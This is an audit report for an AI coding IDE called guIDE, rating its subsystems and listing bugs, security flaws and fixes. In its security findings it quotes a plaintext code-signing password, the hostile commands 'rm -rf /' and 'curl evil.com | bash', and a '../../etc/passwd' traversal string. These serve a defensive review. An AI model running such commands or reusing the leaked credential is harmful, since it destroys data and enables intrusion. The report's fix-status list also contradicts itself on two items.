# guIDE v2.0.0 — Full System Audit

> Conducted: February 2026 | Auditor: Automated deep audit | Scope: All 17,000+ lines

## Overall Score: 6.1/10 (B-)

---

## System-by-System Ratings

| # | System | File | Lines | Rating | Grade |
|---|--------|------|-------|--------|-------|
| 1 | Electron Shell | `electron-main.js` | 499 | 8/10 | A- |
| 2 | Agentic Chat | `main/agenticChat.js` | 1,582 | 5.5/10 | C+ |
| 3 | Local LLM Engine | `main/llmEngine.js` | 1,404 | 7.5/10 | B+ |
| 4 | Cloud LLM Service | `main/cloudLLMService.js` | 992 | 7/10 | B |
| 5 | MCP Tool Server | `main/mcpToolServer.js` | 2,408 | 5/10 | C |
| 6 | Playwright Browser | `main/playwrightBrowser.js` | 1,853 | 7.5/10 | B+ |
| 7 | BrowserView Manager | `main/browserManager.js` | 1,098 | 5.5/10 | C+ |
| 8 | RAG Engine | `main/ragEngine.js` | 448 | 6.5/10 | B- |
| 9 | Memory Store | `main/memoryStore.js` | 200 | 7/10 | B |
| 10 | Terminal Manager | `main/terminalManager.js` | 169 | 6.5/10 | B- |
| 11 | Conversation Summarizer | `main/conversationSummarizer.js` | 469 | 7/10 | B |
| 12 | Renderer / UI | `src/` | ~6,000+ | 6/10 | B- |
| 13 | Security Posture | (cross-cutting) | — | 6/10 | B- |
| 14 | Test Coverage | `tests/` | 7 files | 3/10 | D |

---

## P0 — Critical Issues

### SEC-01: Code-signing certificate password in plaintext
- **File:** `package.json` line ~127
- **Issue:** `"certificatePassword": "GraySoft2026!"` committed to source control
- **Impact:** Anyone with repo access can sign binaries as GraySoft LLC
- **Fix:** Move to environment variable `CSC_KEY_PASSWORD`
- **Status:** ✅ FIXED

### SEC-02: Command injection via `exec()`
- **File:** `main/mcpToolServer.js` — `_runCommand`, `_findFiles`, `_grepSearch`, `_installPackages`, `_gitBranch`, `_gitStash`
- **Issue:** LLM-generated strings passed directly to `exec()` with no sanitization
- **Impact:** Hallucinating model can execute `rm -rf /`, `curl evil.com | bash`, etc.
- **Fix:** Add command sanitizer stripping shell metacharacters (`; | & $ \` > < \n`)
- **Status:** ✅ FIXED

### SEC-03: Path traversal on all file operations
- **File:** `main/mcpToolServer.js` — `_sanitizeFilePath`, `_readFile`, `_writeFile`, `_deleteFile`, `_editFile`, `_renameFile`
- **Issue:** `path.join(projectPath, "../../etc/passwd")` resolves outside project. `_sanitizeFilePath` only catches absolute paths, not relative `..` traversal
- **Fix:** Add `realpath` + prefix check after resolution
- **Status:** ✅ FIXED

### BUG-01: Groq provider completely broken
- **File:** `main/cloudLLMService.js` line ~578
- **Issue:** `groq` missing from `_executeGeneration` switch statement. Falls to `default: throw new Error('Unknown provider')`
- **Impact:** Groq is advertised in UI but always throws
- **Fix:** Add `case 'groq':` to the OpenAI-compatible block
- **Status:** ✅ FIXED

### BUG-02: Anthropic thinking tokens silently dropped
- **File:** `main/cloudLLMService.js` line ~935
- **Issue:** `if (parsed.type === 'content_block_delta')` matches ALL deltas, consumes thinking deltas before the `else if` can check for `thinking_delta`
- **Impact:** Claude reasoning models (Sonnet 4, etc.) lose chain-of-thought display
- **Fix:** Check `parsed.delta?.type` first to distinguish text from thinking
- **Status:** ✅ FIXED

---

## P1 — Important Issues

### ARCH-01: agenticChat.js — 400 lines of cloud/local DRY violation
- **File:** `main/agenticChat.js` + new `main/agenticChatHelpers.js`
- **Issue:** Nudge detection, truncation logic, raw code dump detection, browser auto-snapshot, tool filtering — all copy-pasted between cloud loop and local loop
- **Impact:** Bug fixes in one loop not replicated to the other
- **Fix:** Extracted 7 shared helpers into `agenticChatHelpers.js`: `detectTruncation`, `detectActionHallucination`, `detectRawCodeDump`, `getTruncationNudgeMessage`, `autoSnapshotAfterBrowserAction`, `sendToolExecutionEvents`, `capArray`
- **Status:** ✅ FIXED

### ARCH-02: ChatPanel.tsx is 2,843 lines / 30+ useState hooks
- **File:** `src/components/Chat/ChatPanel.tsx`
- **Issue:** God-component containing settings UI, API key mgmt, model picker, voice input, session management, dev console, message rendering, prompt improvement, file change tracking
- **Impact:** Any state change triggers full re-render of 2,843 lines of JSX
- **Fix:** Extracted 7 sub-modules: ChatWidgets.tsx (6 components), ChatSettingsPanel.tsx, useChatSettings.ts, useChatStreaming.ts, useVoiceInput.ts, useTTS.ts, useChatSessions.ts — ChatPanel reduced to ~2,048 lines
- **Status:** ✅ FIXED

### ARCH-03: MCP tool server is 2,408 lines in one file
- **File:** `main/mcpToolServer.js`
- **Issue:** 40+ tool methods, tool definitions, parsing, execution all in one file
- **Impact:** Hard to navigate, test, and maintain
- **Fix:** Extracted 3 sub-modules via prototype mixin pattern: mcpBrowserTools.js (24 methods), mcpGitTools.js (7 methods), mcpToolParser.js (parsing + aliases) — main file reduced to 1,757 lines
- **Status:** ✅ FIXED

### BUG-03: Error context header never injected into prompt
- **File:** `main/agenticChat.js` line ~618
- **Issue:** `errorSection` string (`## Error Analysis Context\nError: ...`) is built but never passed to `appendIfBudget`. Only individual code chunks are appended.
- **Impact:** LLM never sees the error message in its context — only the code around it
- **Fix:** Append `errorSection` header before the chunks
- **Status:** ✅ FIXED

### BUG-04: Cloud context usage estimate double-counts
- **File:** `main/agenticChat.js` line ~465
- **Issue:** `fullPrompt.length + historySize + fullCloudResponse.length` — but `cloudConversationHistory` already contains prior prompts/responses. Double-counting inflates by ~2x.
- **Fix:** Use only `historySize + fullCloudResponse.length`
- **Status:** ✅ FIXED

### BUG-05: `_editFile` reports wrong replacement count
- **File:** `main/mcpToolServer.js` line ~1416
- **Issue:** `content.replace(oldText, newText)` replaces only the FIRST match, but `content.split(oldText).length - 1` counts ALL matches. Reports e.g. "3 replacements" when only 1 was made.
- **Fix:** Use `replaceAll` and count = `split().length - 1`, or report "1 replacement" when using `replace`
- **Status:** ✅ FIXED

### BUG-06: `getUndoableFiles()` async but not awaited
- **File:** `main/mcpToolServer.js` line ~876
- **Issue:** `result = { success: true, files: this.getUndoableFiles() }` — method is `async` so this returns a Promise, not the array
- **Fix:** Add `await`
- **Status:** ✅ FIXED

### BUG-07: llmEngine `lastEvaluation` not invalidated after abort
- **File:** `main/llmEngine.js` — catch block in generateStream()
- **Issue:** `chatHistory` is mutated in catch blocks but `lastEvaluation` retains stale context window, causing KV cache misalignment on next generation
- **Fix:** Set `this.lastEvaluation = null` at top of catch block before any history mutation
- **Status:** ✅ FIXED

### BUG-08: Terminal default shell inverted on Windows
- **File:** `main/terminalManager.js` — `_getDefaultShell()`
- **Issue:** `process.env.COMSPEC || 'C:\\...\\powershell.exe'` — COMSPEC always exists on Windows (set to cmd.exe), so PowerShell fallback never triggers
- **Fix:** Check for PowerShell 7 → Windows PowerShell → cmd.exe in order
- **Status:** ✅ FIXED

### PERF-01: No chat message virtualization
- **File:** `src/components/Chat/ChatPanel.tsx`
- **Issue:** Long conversations render all messages to DOM — no react-window/react-virtualized
- **Impact:** Scroll performance degrades after ~100 messages
- **Fix:** Integrated react-virtuoso with followOutput auto-scroll, atBottomStateChange for scroll tracking, and streaming indicator as virtual item
- **Status:** ✅ FIXED

### PERF-02: `context.images` grows unbounded
- **File:** `main/agenticChat.js` line ~1281
- **Issue:** Every `browser_screenshot` pushes a base64 data URL onto `context.images`, never pruned
- **Impact:** Hundreds of MB in memory during long browser sessions
- **Fix:** Cap array to last 3 screenshots
- **Status:** ✅ FIXED

### PERF-03: `allToolResults` and `fullResponseText` grow unbounded
- **File:** `main/agenticChat.js`
- **Issue:** Both accumulate across all iterations with no pruning
- **Fix:** Prune `allToolResults` to keep only last 50 entries
- **Status:** ✅ FIXED

### SEC-04: TLS bypass in both browser engines
- **File:** `main/playwrightBrowser.js` (`ignoreHTTPSErrors: false`), `main/browserManager.js` (localhost-only cert bypass)
- **Impact:** Previously accepted all cert errors; now only localhost is exempted
- **Fix:** Set `ignoreHTTPSErrors: false` in Playwright; browserManager only allows cert errors on localhost/127.0.0.1
- **Status:** ✅ FIXED

### SEC-05: CSP allows `unsafe-eval`
- **File:** `electron-main.js` line ~247
- **Issue:** `script-src 'self' 'unsafe-inline' 'unsafe-eval'` negates XSS protection
- **Fix:** Only include `unsafe-eval` in dev mode (`!app.isPackaged`); production builds omit it
- **Status:** ✅ FIXED

### RAG-01: Full content stored in memory with no virtualization
- **File:** `main/ragEngine.js`
- **Issue:** `this.documents.set(docId, { content: chunkContent })` stores all project text in JS heap. ~100MB project → ~100MB Map.
- **Fix:** Add LRU eviction or disk-backed store for large projects
- **Status:** ⬜ TODO (low priority — most projects are <10MB text)

### RAG-02: No concurrent indexing guard
- **File:** `main/ragEngine.js`
- **Issue:** Two simultaneous `indexProject()` calls corrupt internal state (maps cleared at start, race on inserts)
- **Fix:** Add indexing lock
- **Status:** ✅ FIXED

### RAG-03: No incremental re-index
- **File:** `main/ragEngine.js`
- **Issue:** Any file change required full project re-index
- **Fix:** Added `reindexChanged()` with mtime tracking + debounced trigger from file-change events
- **Status:** ✅ FIXED

---

## Per-System Strengths

| System | Key Strength |
|--------|-------------|
| **Electron Shell** | Textbook security hardening: contextIsolation, deny-by-default permissions, proper lifecycle/crash handling |
| **Agentic Chat** | Sophisticated anti-hallucination nudging, proactive context rotation, isStale() cancellation |
| **Local LLM** | KV cache reuse, GPU→CPU fallback, flash attention toggle, speculative decoding, 6-retry context auto-sizing |
| **Cloud LLM** | 16 providers, key pool rotation with per-key cooldown, multi-layer fallback chain |
| **Playwright** | Multi-strategy DOM snapshot with ref injection, frame-aware extraction, ad-domain skipping |
| **MCP Tools** | Battle-tested LLM drift normalization (alias maps, param correction, ref format cleanup) |
| **RAG** | Clean BM25 with IDF + document-length normalization, score-based relevance filtering |
| **Memory** | Bounded storage with truncation limits, OS keychain API key encryption |
| **Summarizer** | Structured ledger preserving goal/corrections/findings across context rotations |
| **UI** | Consistent useCallback discipline, DOMPurify sanitization, good a11y foundation |

---

## Test Coverage Gap

Only **7 unit test files** exist:
- `chatContentParser.test.ts`
- `fileUtils.test.ts`
- `helpers.test.ts`
- `keyPool.test.ts`
- `modelPicker.test.ts`
- `pathValidator.test.ts`
- `sanitize.test.ts`

**Zero coverage on:** agenticChat, llmEngine, cloudLLMService, mcpToolServer, playwrightBrowser, browserManager, ragEngine, all 16 IPC handler modules, all UI components. No integration tests. No E2E tests.

---

## Priority Fix Order

1. ~~Remove cert password from package.json~~ ✅
2. ~~Sanitize shell commands in MCP tools~~ ✅
3. ~~Add path traversal protection~~ ✅
4. ~~Fix Groq switch case~~ ✅
5. ~~Fix Anthropic thinking token parsing~~ ✅
6. ~~Fix agenticChat error context injection~~ ✅
7. ~~Fix agenticChat cloud context double-count~~ ✅
8. ~~Fix MCP editFile count + getUndoable await~~ ✅
9. ~~Extract shared agenticChat helpers~~ ✅
10. ~~Fix RAG concurrent indexing~~ ✅
11. ~~Cap context.images + allToolResults~~ ✅
12. ~~Fix terminal default shell~~ ✅
13. ~~Fix TLS bypass in browser engines~~ ✅
14. ~~Fix CSP unsafe-eval in production~~ ✅
15. ~~Add RAG incremental re-index~~ ✅
16. ~~Fix llmEngine lastEvaluation on abort~~ ✅
17. Split ChatPanel.tsx (future)
18. Add chat virtualization (future)
19. Add test coverage (future)
